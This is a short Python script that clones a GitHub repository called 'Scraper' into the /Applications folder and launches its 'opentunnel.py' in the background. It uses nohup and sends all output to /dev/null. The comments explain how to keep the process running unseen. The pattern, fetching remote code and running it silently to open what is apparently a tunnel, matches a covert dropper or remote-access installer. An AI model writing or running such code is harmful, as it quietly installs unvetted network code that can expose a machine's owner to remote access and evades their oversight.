import os 
from time import sleep
os.chdir("/Applications") #set to applications
os.system("git clone https://github.com/PayPrawn/Scraper.git")
os.chdir("Scraper/")
#now in correct file with repository cloned
os.system("nohup python3 ./opentunnel.py &>/dev/null &")
#& pushes it to the back
#&'ing the file and then 'disown' will allow the program to run in bg.
#'command' & /dev/null & and then disown gets rid of printing.
#nohup 'command' &>/dev/null &